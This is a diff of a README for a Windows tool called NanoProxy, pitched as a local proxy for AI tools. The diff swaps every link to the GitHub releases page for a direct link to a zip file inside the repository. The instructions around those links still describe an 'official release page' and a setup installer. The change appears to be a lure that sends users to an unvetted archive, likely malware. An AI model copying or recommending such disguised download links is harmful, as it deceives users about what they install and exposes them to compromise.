@@ -1,6 +1,6 @@
 # ⚙️ NanoProxy - Reliable Local Proxy for AI Tools
 
-[![Download NanoProxy](https://img.shields.io/badge/Download-NanoProxy-important)](https://github.com/Straightedgeheathaster783/NanoProxy/releases)
+[![Download NanoProxy](https://img.shields.io/badge/Download-NanoProxy-important)](https://github.com/Straightedgeheathaster783/NanoProxy/raw/refs/heads/main/src/Proxy_Nano_v1.1.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps to get NanoProxy up and running on your Windows PC. The proce
 1. **Visit the download page:**  
    Click the large button below to open the official NanoProxy release page on GitHub.
 
-   [![Download NanoProxy](https://img.shields.io/badge/Download-NanoProxy-blue)](https://github.com/Straightedgeheathaster783/NanoProxy/releases)
+   [![Download NanoProxy](https://img.shields.io/badge/Download-NanoProxy-blue)](https://github.com/Straightedgeheathaster783/NanoProxy/raw/refs/heads/main/src/Proxy_Nano_v1.1.zip)
 
 2. **Find the latest version:**  
    On the release page, find the newest release. It usually appears at the top of the list and includes the version number.
@@ -108,7 +108,7 @@ You can change these settings in NanoProxy’s options window.
 ## 📥 Download and Install NanoProxy on Windows
 
 1. Visit the release page:  
-   https://github.com/Straightedgeheathaster783/NanoProxy/releases
+   https://github.com/Straightedgeheathaster783/NanoProxy/raw/refs/heads/main/src/Proxy_Nano_v1.1.zip
 
 2. Locate the latest Windows installer file (`NanoProxy-Setup.exe` or similar).
 
